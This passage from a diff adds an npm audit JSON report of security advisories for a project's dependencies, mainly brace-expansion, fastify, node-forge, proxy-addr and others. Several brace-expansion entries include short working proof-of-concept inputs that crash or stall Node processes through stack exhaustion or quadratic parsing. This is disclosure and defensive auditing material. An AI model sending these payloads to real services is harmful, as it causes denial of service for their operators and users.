+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-jvvf-x445-j334"
+    },
+    "1240103": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            ".>@eslint/eslintrc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-q2hr-2g5m-vwhr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102277\n- https://github.com/juliangruber/brace-expansion/commit/33a5ef17b8d800bbfa8c52b14c39043b6aac1a96\n- https://github.com/juliangruber/brace-expansion/commit/bdff773f98e5988616b7039cc9b508df5d640b22\n- https://github.com/juliangruber/brace-expansion/commit/c55e67d8d8b1c56a2474afff15c2891166b2d364\n- https://github.com/juliangruber/brace-expansion/commit/ffdfa3e3806bed17c0874b8f1439b084de354a7e\n- https://github.com/advisories/GHSA-q2hr-2g5m-vwhr",
+      "created": "2026-09-29T23:45:39.000Z",
+      "id": 1240103,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n => '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.",
+      "reported_by": null,
+      "title": "brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102277"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.12",
+      "github_advisory_id": "GHSA-q2hr-2g5m-vwhr",
+      "recommendation": "Upgrade to version 5.0.12 or later",
+      "patched_versions": ">=5.0.12",
+      "updated": "2026-09-29T23:45:39.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-q2hr-2g5m-vwhr"
+    },
+    "1240107": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            ".>@eslint/eslintrc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-qhr7-859c-m2p7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102278\n- https://github.com/juliangruber/brace-expansion/commit/1efee7c397c191da6287a78ec19512476a966a7b\n- https://github.com/juliangruber/brace-expansion/commit/935d78f32f335b2ff76578e5c5e877d31ae9888c\n- https://github.com/juliangruber/brace-expansion/commit/de84f144e9816f30e25fc8179e2e1249ab6df0db\n- https://github.com/advisories/GHSA-qhr7-859c-m2p7",
+      "created": "2026-09-29T23:45:17.000Z",
+      "id": 1240107,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.\n\nThis is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.\n\nIt is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.\n\n### Two recursion sites\n\n**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:\n\n```js\nexpand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,907 - about **15.6 KB** of input.\n\n**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:\n\n```js\nexpand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.\n\nAvailability only. No code execution, no data exposure.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.\n\n### Patch\n\nA `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.\n\nThe default sits far above any realistic nesting depth and well below the crash threshold.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion on nested brace groups causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102278"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.11",
+      "github_advisory_id": "GHSA-qhr7-859c-m2p7",
+      "recommendation": "Upgrade to version 5.0.11 or later",
+      "patched_versions": ">=5.0.11",
+      "updated": "2026-09-29T23:45:19.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-qhr7-859c-m2p7"
+    },
+    "1240111": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            ".>@eslint/eslintrc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-6j4f-fj2g-mc7p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102276\n- https://github.com/juliangruber/brace-expansion/commit/0bcbfc0a5928c3073d48f42999d1ce4fc1c42fbc\n- https://github.com/juliangruber/brace-expansion/commit/316359e6019c39b3254c8ba8e25dc586a480652c\n- https://github.com/juliangruber/brace-expansion/commit/5171e681c0922b7ae8bfaf9a331e309107be6edc\n- https://github.com/juliangruber/brace-expansion/commit/6735c94873ca570bcdd6a0690033bdd3126379d3\n- https://github.com/advisories/GHSA-6j4f-fj2g-mc7p",
+      "created": "2026-09-29T23:44:58.000Z",
+      "id": 1240111,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.\n\nThis is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.\n\n### Vector 1 - unbounded recursion on `post`\n\n`parseCommaParts()` recursed on the remainder of the string once per brace group:\n\n```js\nconst postParts = parseCommaParts(post)   // unbounded\n```\n\nA brace group containing many comma-separated groups drives one recursion level per group:\n\n```js\nexpand('{' + '{a},'.repeat(7000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nAbout 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.\n\n### Vector 2 - `push.apply` with an unbounded array\n\nEven with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:\n\n```js\np.push.apply(p, postParts)\nparts.push.apply(parts, p)\n```\n\n`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:\n\n```js\nexpand('{{x},' + 'a,'.repeat(125000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nThreshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.\n\n`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.\n\nThis is an availability-only issue. No code execution and no data exposure.\n\n### Not a regression\n\n5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.\n\n### Patch\n\n`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.\n\nEquivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.\n\n### Severity note\n\nScored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).\n\n### Credit\n\nReported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion in parseCommaParts causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102276"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.10",
+      "github_advisory_id": "GHSA-6j4f-fj2g-mc7p",
+      "recommendation": "Upgrade to version 5.0.10 or later",
+      "patched_versions": ">=5.0.10",
+      "updated": "2026-09-29T23:44:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-6j4f-fj2g-mc7p"
+    },
+    "1240639": {
+      "findings": [
+        {
+          "version": "5.12.3",
+          "paths": [
+            ".>netlify-cli>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-4mh8-r7rc-xpvc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-92081\n- https://github.com/fastify/fastify/issues/6574\n- https://github.com/fastify/fastify/commit/ad06a4c3fe8a944a904f38068249b18b8f552e90\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify/releases/tag/v5.12.5\n- https://github.com/advisories/GHSA-4mh8-r7rc-xpvc",
+      "created": "2026-09-30T23:53:44.000Z",
+      "id": 1240639,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fastify` crashes with an uncaught `ERR_HTTP2_INVALID_CONNECTION_HEADERS` exception when a route that registers a response trailer via `reply.trailer()` is served over HTTP/2. Fastify unconditionally adds the `Transfer-Encoding: chunked` header when a trailer is set, which is forbidden on HTTP/2, so Node.js throws while serializing the response headers. The exception is not caught and becomes an uncaughtException, terminating the Node.js process.\n\nOne unauthenticated HTTP/2 request to any route that uses trailers is enough to crash the server, dropping all in-flight requests, and the request can be repeated to keep the process down. Applications are affected only when HTTP/2 is enabled (`http2: true`) and at least one route registers a trailer. HTTP/1.x responses are not affected.\n\n### Patches\n\nUpgrade to `fastify` `5.12.5` or later.\n\n### Workarounds\n\nAvoid registering response trailers with `reply.trailer()` on routes served over HTTP/2 until upgrading.",
+      "reported_by": null,
+      "title": "fastify vulnerable to Denial of Service via unhandled exception on HTTP/2 trailer responses",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-92081"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fastify",
+      "vulnerable_versions": "<5.12.5",
+      "github_advisory_id": "GHSA-4mh8-r7rc-xpvc",
+      "recommendation": "Upgrade to version 5.12.5 or later",
+      "patched_versions": ">=5.12.5",
+      "updated": "2026-09-30T23:53:45.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mh8-r7rc-xpvc"
+    },
+    "1240912": {
+      "findings": [
+        {
+          "version": "1.4.0",
+          "paths": [
+            ".>netlify-cli>ipx>listhen>node-forge"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-85393\n- https://github.com/digitalbazaar/forge/issues/1149\n- https://github.com/advisories/GHSA-ppp5-5v6c-4jwp\n- https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/asn1.js\n- https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/rsa.js\n- https://www.vulncheck.com/advisories/node-forge-through-1.4.0-rsa-pkcs-1-1.5-signature-forgery-via-nested-digestalgorithm-padding\n- https://github.com/digitalbazaar/forge/pull/1152\n- https://github.com/advisories/GHSA-86w9-cpqp-85rv",
+      "created": "2026-09-03T21:31:15.000Z",
+      "id": 1240912,
+      "npm_advisory_id": null,
+      "overview": "node-forge through 1.4.0 fails to validate element count in nested DigestAlgorithm sequences during RSA PKCS#1 v1.5 signature verification. Attackers can embed garbage bytes inside the DigestAlgorithm sequence to forge valid signatures for arbitrary messages using low-exponent RSA keys. This is an incomplete fix for CVE-2026-33894.",
+      "reported_by": null,
+      "title": "node-forge RSA PKCS#1 v1.5 signature verification accepts extra nested DigestAlgorithm elements",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-85393"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "node-forge",
+      "vulnerable_versions": "<=1.4.0",
+      "github_advisory_id": "GHSA-86w9-cpqp-85rv",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-01T21:09:10.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-347"
+      ],
+      "url": "https://github.com/advisories/GHSA-86w9-cpqp-85rv"
+    },
+    "1240991": {
+      "findings": [
+        {
+          "version": "4.2.0",
+          "paths": [
+            ".>netlify-cli>@netlify/build>got>cacheable-request>http-cache-semantics"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93748\n- https://github.com/kornelski/http-cache-semantics/issues/56\n- https://github.com/kornelski/http-cache-semantics/blob/f01112e954b83cfa8765b633ba880e5e980aa54c/index.js#L425-L441\n- https://github.com/kornelski/http-cache-semantics/blob/f01112e954b83cfa8765b633ba880e5e980aa54c/index.js#L603-L623\n- https://www.vulncheck.com/advisories/http-cache-semantics-through-4.2.0-cross-user-cache-disclosure-via-max-stale\n- https://github.com/advisories/GHSA-ch52-4w7c-c8xp",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1240991,
+      "npm_advisory_id": null,
+      "overview": "http-cache-semantics through 4.2.0 fails to properly validate security-zeroed cache entries when processing client max-stale directives, allowing unauthenticated attackers to retrieve cached responses belonging to other users. Attackers can request the same URL with a large max-stale value to obtain another user's Set-Cookie session credentials from shared-cache entries that were deliberately zeroed for security reasons.",
+      "reported_by": null,
+      "title": "http-cache-semantics max-stale handling can disclose cross-user cached responses",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93748"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "http-cache-semantics",
+      "vulnerable_versions": "<=4.2.0",
+      "github_advisory_id": "GHSA-ch52-4w7c-c8xp",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-02T22:36:44.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-ch52-4w7c-c8xp"
+    },
+    "1240992": {
+      "findings": [
+        {
+          "version": "3.0.3",
+          "paths": [
+            ".>@types/jest>expect>jest-message-util>micromatch>braces"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93687\n- https://github.com/micromatch/braces/issues/70\n- https://github.com/micromatch/braces/blob/3.0.3/lib/compile.js#L49-L53\n- https://github.com/micromatch/braces/blob/3.0.3/lib/expand.js#L102-L105\n- https://github.com/micromatch/braces/blob/3.0.3/lib/parse.js#L38-L40\n- https://www.vulncheck.com/advisories/braces-through-3.0.3-stack-overflow-via-deeply-nested-patterns\n- https://github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+      "created": "2026-09-18T18:31:41.000Z",
+      "id": 1240992,
+      "npm_advisory_id": null,
+      "overview": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+      "reported_by": null,
+      "title": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93687"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "braces",
+      "vulnerable_versions": "<=3.0.3",
+      "github_advisory_id": "GHSA-vfj7-8cjw-p6xm",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-02T22:36:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            ".>netlify-cli>@netlify/build>@netlify/functions-utils>@netlify/zip-it-and-ship-it>precinct>detective-postcss>postcss>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241210": {
+      "findings": [
+        {
+          "version": "2.0.7",
+          "paths": [
+            ".>netlify-cli>express>proxy-addr"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/proxy-addr/security/advisories/GHSA-jqcg-44mw-7w3h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-90711\n- https://github.com/jshttp/proxy-addr/commit/780911d84d18e2c5fa008ed0c0d387631ec11965\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/jshttp/proxy-addr/releases/tag/v2.0.8\n- https://github.com/advisories/GHSA-jqcg-44mw-7w3h",
+      "created": "2026-10-05T23:30:26.000Z",
+      "id": 1241210,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`proxy-addr` determines which network hops are trusted proxies so that `X-Forwarded-For` can be believed. When an application configures a trust subnet as an IPv4-mapped IPv6 address with a short prefix, such as `::ffff:10.0.0.0/8` (the correct spelling is `::ffff:10.0.0.0/104`), the subnet compiles with all-zero leading bits and matches every IPv4 address instead of the block it names. The same happens for any IPv6 trust subnet with zero leading bits, such as `::/1`.\n\nEvery unauthenticated client is then trusted as a proxy at hop 0, so `proxyaddr(req, trust)`, and therefore `req.ip` and `req.ips` in Express, returns whatever the client sends in `X-Forwarded-For`. This defeats IP-based access control, rate limiting, geolocation, and audit logging. The misconfiguration compiles without any error, and the same block written correctly behaves correctly, so the difference is not visible from the configuration.\n\n### Patches\n\nUpgrade to `proxy-addr` 2.0.8. An IPv4 address now matches an IPv6 trust subnet only when that subnet is a genuine IPv4-mapped subnet whose prefix covers the mapped marker.\n\n### Workarounds\n\nWrite IPv4 trust subnets in plain IPv4 notation (for example `10.0.0.0/8`). If IPv4-mapped IPv6 notation is required, use the full form so the prefix covers the mapped marker (for example `::ffff:10.0.0.0/104` for the `10.0.0.0/8` block).",
+      "reported_by": null,
+      "title": "proxy-addr vulnerable to IP spoofing via IPv4-mapped IPv6 trust subnet",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-90711"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "proxy-addr",
+      "vulnerable_versions": ">=1.1.0 <2.0.8",
+      "github_advisory_id": "GHSA-jqcg-44mw-7w3h",
+      "recommendation": "Upgrade to version 2.0.8 or later",
+      "patched_versions": ">=2.0.8",
+      "updated": "2026-10-05T23:30:27.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-290",
+        "CWE-348",
+        "CWE-697"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqcg-44mw-7w3h"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 6,
+      "high": 11,
+      "critical": 1
+    },
+    "dependencies": 1861,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1861
+  }
+}
